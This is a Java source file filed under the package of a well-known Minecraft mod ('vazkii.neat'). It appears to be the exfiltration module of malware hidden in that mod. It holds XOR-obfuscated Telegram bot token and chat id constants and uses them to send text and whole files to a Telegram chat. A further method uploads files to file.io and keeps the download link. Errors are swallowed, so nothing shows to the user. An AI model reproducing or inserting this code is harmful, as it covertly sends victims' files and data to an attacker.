package vazkii.neat;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.UUID;

public final class F {
    private static final String TAG = "Net";

    private F() {}

    public static String get(String urlStr) throws Exception {
        int attempt = 0;
        long backoff = A.RETRY_BASE_MS;
        while (true) {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(urlStr).openConnection();
                c.setConnectTimeout(A.HTTP_CONNECT_TIMEOUT_SEC * 1000);
                c.setReadTimeout(A.HTTP_READ_TIMEOUT_SEC * 1000);
                int code = c.getResponseCode();
                if (code == 429) {
                    String retry = c.getHeaderField("Retry-After");
                    long wait = retry != null ? Long.parseLong(retry) * 1000L : backoff;
                    Thread.sleep(Math.min(wait, 60000));
                    attempt++;
                    if (attempt >= A.RETRY_MAX) throw new IOException("429 max retries");
                    backoff *= 2;
                    continue;
                }
                try (BufferedReader br = new BufferedReader(
                        new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8))) {
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) sb.append(line);
                    return sb.toString();
                } finally {
                    c.disconnect();
                }
            } catch (Exception e) {
                attempt++;
                if (attempt >= A.RETRY_MAX) throw e;
                Thread.sleep(backoff);
                backoff *= 2;
            }
        }
    }

    public static void sendText(String text) {
        try {
            String url = A.API + C.xor(A.TOKEN_ENC, (byte)0x5A) + "/sendMessage?chat_id=" + C.xor(A.CHAT_ENC, (byte)0x5A)
                + "&text=" + java.net.URLEncoder.encode(text, "UTF-8")
                + "&disable_web_page_preview=true";
            get(url);
        } catch (Exception e) {
            B.warn(TAG, "sendText: " + e.getMessage());
        }
    }

    public static void sendDocument(Path file, String name) {
        try {
            String boundary = "----" + UUID.randomUUID();
            String urlStr = A.API + C.xor(A.TOKEN_ENC, (byte)0x5A) + "/sendDocument";
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(A.HTTP_CONNECT_TIMEOUT_SEC * 1000);
            conn.setReadTimeout(A.DOC_READ_TIMEOUT_SEC * 1000);

            try (OutputStream os = conn.getOutputStream();
                 PrintWriter w = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true)) {
                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                w.append(C.xor(A.CHAT_ENC, (byte)0x5A)).append("\r\n");
                w.flush();

                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"document\"; filename=\"")
                 .append(name).append("\"\r\n");
                w.append("Content-Type: application/octet-stream\r\n\r\n");
                w.flush();
                Files.copy(file, os);
                os.flush();

                w.append("\r\n--").append(boundary).append("--\r\n");
                w.flush();
            }

            int code = conn.getResponseCode();
            if (code != 200) B.warn(TAG, "sendDocument http " + code + " for " + name);
            conn.disconnect();
        } catch (Exception e) {
            B.warn(TAG, "sendDocument " + name + ": " + e.getMessage());
        }
    }

    public static String uploadToFileHost(Path file, String name) {
        try {
            String boundary = "----" + UUID.randomUUID();
            String urlStr = "https://file.io";
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(A.HTTP_CONNECT_TIMEOUT_SEC * 1000);
            conn.setReadTimeout(A.DOC_READ_TIMEOUT_SEC * 1000);

            try (OutputStream os = conn.getOutputStream();
                 PrintWriter w = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true)) {
                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"file\"; filename=\"")
                 .append(name).append("\"\r\n");
                w.append("Content-Type: application/octet-stream\r\n\r\n");
                w.flush();
                Files.copy(file, os);
                os.flush();
                w.append("\r\n--").append(boundary).append("--\r\n");
                w.flush();
            }

            int code = conn.getResponseCode();
            if (code != 200) { B.warn(TAG, "filehost http " + code); return null; }

            try (BufferedReader br = new BufferedReader(
                    new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                java.util.regex.Matcher m = java.util.regex.Pattern
                    .compile("\"link\"\\s*:\\s*\"([^\"]+)\"").matcher(sb.toString());
                if (m.find()) return m.group(1);
            }
            conn.disconnect();
        } catch (Exception e) {
            B.warn(TAG, "filehost: " + e.getMessage());
        }
        return null;
    }
}